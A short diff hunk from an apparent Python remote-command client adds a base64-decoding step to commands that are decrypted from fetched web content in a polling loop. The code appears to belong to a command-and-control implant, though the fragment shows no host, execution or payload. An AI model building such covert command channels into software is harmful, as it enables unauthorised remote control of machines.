@@ -112,6 +112,7 @@ while(True):
       try:
         returncmd = decrypt(key, html)
         returncmd = returncmd.rstrip('\\0')
+        returncmd = base64.b64decode(returncmd)
 
         if "multicmd" in returncmd:
 
